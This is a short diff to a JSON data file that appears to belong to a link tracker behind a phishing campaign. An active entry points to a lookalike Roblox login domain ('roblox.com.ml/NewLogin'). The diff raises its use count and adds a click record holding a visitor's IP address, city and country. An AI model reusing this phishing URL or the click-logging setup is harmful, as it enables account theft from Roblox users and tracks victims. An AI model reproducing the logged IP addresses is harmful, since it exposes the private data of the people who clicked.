@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 724,
+    "useCount": 725,
     "createdBy": "admin",
     "clicks": [
       {
@@ -5904,6 +5904,14 @@
         "city": "Melun",
         "flag": "🇫🇷",
         "countryCode": "FR"
+      },
+      {
+        "timestamp": 1777141447229,
+        "ip": "186.167.168.45",
+        "country": "Venezuela",
+        "city": "Caracas",
+        "flag": "🇻🇪",
+        "countryCode": "VE"
       }
     ]
   },
